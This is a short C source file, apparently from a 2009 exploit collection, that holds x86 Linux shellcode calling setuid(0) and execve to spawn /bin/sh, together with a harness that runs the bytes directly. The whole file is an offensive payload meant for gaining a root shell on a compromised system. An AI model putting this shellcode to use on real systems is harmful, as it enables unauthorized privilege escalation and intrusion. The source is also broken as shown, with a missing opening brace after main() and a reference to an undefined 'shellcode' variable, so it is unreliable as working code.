#include <stdio.h>

const char sc[]= "\x31\xdb"
                 "\x8d\x43\x17"
                 "\x99"
                 "\xcd\x80"
                 "\xb0\x0b" //setuid(0) shouldn't returns -1 right? ;)
                 "\x52"
                 "\x68\x6e\x2f\x73\x68"
                 "\x68\x2f\x2f\x62\x69"
                 "\x89\xe3"
                 "\x89\xd1"
                 "\xcd\x80";

int main()

  printf("\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE "
        "WITHOUT NULLS THAT SPAWNS A SHELL"
                        "\n\nCoded by vlan7"
                        "\n\t + vlan7[at]bigfoot.com"
                        "\n\t + http://vlan7.blogspot.com"
                        "\n\n[+] Date: 4/Jul/2009"
                        "\n[+] Thanks to: sch3m4 He has initiated the funny game..."
                        "\n\n[+] Shellcode Size: %d bytes\n\n",
                        sizeof(shellcode)-1);
        (*(void (*)()) sc)();
        return 0;
}




